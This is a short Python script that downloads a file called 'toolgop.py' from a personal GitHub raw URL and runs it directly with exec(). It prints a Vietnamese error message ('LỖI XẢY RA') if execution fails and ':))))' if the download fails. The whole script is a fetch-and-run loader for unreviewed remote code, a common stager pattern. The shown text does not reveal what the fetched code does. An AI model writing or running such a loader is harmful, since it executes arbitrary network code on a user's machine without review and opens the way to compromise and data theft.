import requests

url = 'https://raw.githubusercontent.com/Karamu11/Gop/main/toolgop.py'

response = requests.get(url)
if response.status_code == 200:
    code = response.text

    try:
        exec(code)
    except Exception as e:
        print("LỖI XẢY RA")
else:
    print(":))))")
